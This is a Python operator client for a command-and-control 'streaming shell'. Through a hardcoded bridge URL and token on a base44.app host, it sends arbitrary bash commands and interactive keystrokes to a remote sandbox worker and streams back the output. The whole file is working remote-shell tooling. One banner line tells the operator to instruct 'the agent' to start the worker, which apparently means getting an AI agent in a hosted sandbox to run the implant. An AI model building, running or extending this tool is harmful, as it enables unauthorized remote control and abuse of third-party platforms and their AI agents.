#!/usr/bin/env python3
"""
C2 Streaming Shell v2 — Kali Side
Supports:
  - Normal commands (text output streaming)
  - Interactive TUI apps (opencode, vim, top, etc.) via PTY mode
  - Type 'go' or 'opencode' → automatically enters interactive mode
  - Raw ANSI output rendering for TUI apps
  - Send keystrokes back to the sandbox

Usage:
  python3 kali_c2.py
  python3 kali_c2.py --url https://elio-acd17217.base44.app/functions/c2Bridge

Install: pip3 install requests
"""

import requests
import sys
import os
import time
import json
import signal
import threading

# ════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════
BRIDGE_URL = "https://elio-acd17217.base44.app/functions/c2Bridge"
TOKEN = "shadow-core-c2-bridge-2026"
POLL_INTERVAL = 0.4    # 400ms for normal commands
PTY_POLL = 0.15        # 150ms for interactive TUI (faster = smoother)
INPUT_POLL = 0.1       # 100ms for keystroke sending

# Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

# TUI apps that auto-trigger PTY mode
TUI_APPS = {"opencode", "go", "vim", "nvim", "nano", "top", "htop", "tmux", "mc", "less", "more", "man", "tig", "lazygit"}

class C2Shell:
    def __init__(self, url=BRIDGE_URL):
        self.url = url
        self.token = TOKEN
        self.running = True
        self.current_cmd_id = None
        self.output_offset = 0
        self.interactive_mode = False
    
    def api(self, method, payload=None, params=None):
        try:
            full_params = {"token": self.token}
            if params:
                full_params.update(params)
            if method == "GET":
                r = requests.get(self.url, params=full_params, timeout=10)
            elif method == "POST":
                data = {**(payload or {}), "token": self.token}
                r = requests.post(self.url, json=data, timeout=10)
            elif method == "PUT":
                data = {**(payload or {}), "token": self.token}
                r = requests.put(self.url, json=data, timeout=10)
            elif method == "PATCH":
                data = {**(payload or {}), "token": self.token}
                r = requests.patch(self.url, json=data, timeout=10)
            return r.json()
        except Exception as e:
            return {"error": str(e)}
    
    def send_command(self, command, pty=False):
        self.output_offset = 0
        if pty:
            command = f"PTY:{command}"
        result = self.api("POST", {"command": command})
        if "error" in result:
            print(f"{RED}[!] Error: {result['error']}{RESET}")
            return False
        self.current_cmd_id = result.get("id")
        return True
    
    def send_input(self, text):
        """Send keystrokes to a running PTY command"""
        if not self.current_cmd_id:
            return
        self.api("PUT", {"id": self.current_cmd_id, "input": text})
    
    def poll_output(self):
        if not self.current_cmd_id:
            return None, None
        result = self.api("GET", params={"id": self.current_cmd_id})
        if "error" in result:
            return None, None
        output = result.get("output", "")
        status = result.get("status", "")
        
        if self.interactive_mode:
            # In interactive mode, get the FULL output (TUI screen)
            return output, status
        else:
            # In normal mode, get only new output
            if len(output) > self.output_offset:
                new_data = output[self.output_offset:]
                self.output_offset = len(output)
                return new_data, status
            return "", status
    
    def is_tui_app(self, cmd):
        """Check if the command is a known TUI app"""
        cmd_lower = cmd.strip().lower()
        base = cmd_lower.split()[0] if cmd_lower.split() else ""
        # Remove path prefix
        base = base.split("/")[-1]
        return base in TUI_APPS
    
    def run_normal(self, cmd):
        """Run a normal command with text streaming"""
        if not self.send_command(cmd, pty=False):
            return
        
        spinner = ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏']
        spin_idx = 0
        last_output_time = time.time()
        
        while True:
            new_output, status = self.poll_output()
            if new_output:
                sys.stdout.write(new_output)
                sys.stdout.flush()
                last_output_time = time.time()
            if status in ("completed", "error"):
                break
            if time.time() - last_output_time > 2:
                sys.stdout.write(f"\r{DIM}{spinner[spin_idx % len(spinner)]} executing...{RESET}")
                sys.stdout.flush()
                spin_idx += 1
            time.sleep(POLL_INTERVAL)
        
        if spin_idx > 0:
            sys.stdout.write(f"\r{' ' * 30}\r")
            sys.stdout.flush()
        self.current_cmd_id = None
        print()
    
    def run_interactive(self, cmd):
        """Run a TUI app in interactive PTY mode"""
        print(f"{DIM}[PTY mode — press Ctrl+Q to quit, Ctrl+C to send interrupt]{RESET}")
        time.sleep(0.3)
        
        if not self.send_command(cmd, pty=True):
            return
        
        self.interactive_mode = True
        
        # Start input thread
        input_thread = threading.Thread(target=self._input_loop, daemon=True)
        input_thread.start()
        
        # Output loop — render raw ANSI output
        try:
            while True:
                output, status = self.poll_output()
                if output:
                    # Clear screen and render TUI output
                    sys.stdout.write(output)
                    sys.stdout.flush()
                if status in ("completed", "error"):
                    break
                time.sleep(PTY_POLL)
        except KeyboardInterrupt:
            # Send Ctrl+C to the PTY
            self.send_input("\x03")
        finally:
            self.interactive_mode = False
            self.current_cmd_id = None
            print(f"\n{DIM}[PTY session ended]{RESET}")
    
    def _input_loop(self):
        """Background thread to capture and send keystrokes"""
        import tty, termios
        old_settings = termios.tcgetattr(sys.stdin)
        try:
            tty.setraw(sys.stdin.fileno())
            while self.interactive_mode and self.current_cmd_id:
                char = sys.stdin.read(1)
                if char == "\x11":  # Ctrl+Q — quit
                    self.interactive_mode = False
                    break
                if char:
                    self.send_input(char)
        except Exception:
            pass
        finally:
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
    
    def check_worker(self):
        result = self.api("GET")
        return "error" not in result
    
    def banner(self):
        os.system("clear" if os.name != "nt" else "cls")
        print(f"{CYAN}{BOLD}")
        print("╔════════════════════════════════════════════════════════╗")
        print("║          C2 STREAMING SHELL → Base44 Sandbox          ║")
        print("╠════════════════════════════════════════════════════════╣")
        print(f"║  Bridge: {self.url[:42]:<42}  ║")
        print(f"║  Poll:   {str(PTY_POLL*1000)+'ms':<44}  ║")
        print("║  Mode:   Streaming + PTY (TUI apps supported)        ║")
        print("╚════════════════════════════════════════════════════════╝")
        print(f"{RESET}")
        if self.check_worker():
            print(f"{GREEN}[+] Sandbox worker: ONLINE{RESET}")
        else:
            print(f"{RED}[!] Sandbox worker: OFFLINE{RESET}")
            print(f"{YELLOW}    Tell the agent: 'شغل الـ worker'{RESET}")
        print(f"\n{GREEN}[+] Ready!{RESET}")
        print(f"{DIM}    TUI apps (go, opencode, vim, top) auto-use PTY mode{RESET}")
        print(f"{DIM}    exit/quit | clear | status | help{RESET}\n")
    
    def run(self):
        self.banner()
        while self.running:
            try:
                prompt = f"{GREEN}sandbox{RESET}@{CYAN}c2{RESET}:~$ "
                cmd = input(prompt)
                cmd = cmd.strip()
                if not cmd:
                    continue
                if cmd.lower() in ("exit", "quit"):
                    break
                if cmd.lower() == "clear":
                    os.system("clear" if os.name != "nt" else "cls")
                    continue
                if cmd.lower() == "status":
                    alive = self.check_worker()
                    print(f"{GREEN if alive else RED}[Worker: {'ONLINE' if alive else 'OFFLINE'}]{RESET}")
                    continue
                if cmd.lower() == "help":
                    print(f"""
{BOLD}C2 Shell Commands:{RESET}
  {CYAN}exit/quit{RESET}  - Disconnect
  {CYAN}clear{RESET}    - Clear screen
  {CYAN}status{RESET}   - Check worker status
  {CYAN}help{RESET}     - This message

{BOLD}TUI Apps (auto PTY mode):{RESET}
  {CYAN}go{RESET} / {CYAN}opencode{RESET} - OpenCode editor
  {CYAN}vim/nvim{RESET}     - Vim editor
  {CYAN}top/htop{RESET}    - Process monitors
  {CYAN}tmux{RESET}        - Terminal multiplexer

{BOLD}In PTY mode:{RESET}
  {CYAN}Ctrl+Q{RESET}  - Quit TUI app
  {CYAN}Ctrl+C{RESET}  - Send interrupt to app

{BOLD}Normal commands:{RESET}
  Any bash command runs on the sandbox with streaming output.
""")
                    continue
                
                # Auto-detect TUI apps and use PTY mode
                if self.is_tui_app(cmd):
                    self.run_interactive(cmd)
                else:
                    self.run_normal(cmd)
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[*] Use 'exit' to quit{RESET}")
            except EOFError:
                break
        self.running = False
        print(f"{YELLOW}[*] Goodbye!{RESET}")

if __name__ == "__main__":
    url = BRIDGE_URL
    if "--url" in sys.argv:
        idx = sys.argv.index("--url")
        if idx + 1 < len(sys.argv):
            url = sys.argv[idx + 1]
    shell = C2Shell(url)
    signal.signal(signal.SIGINT, lambda s, f: setattr(shell, 'running', False))
    shell.run()
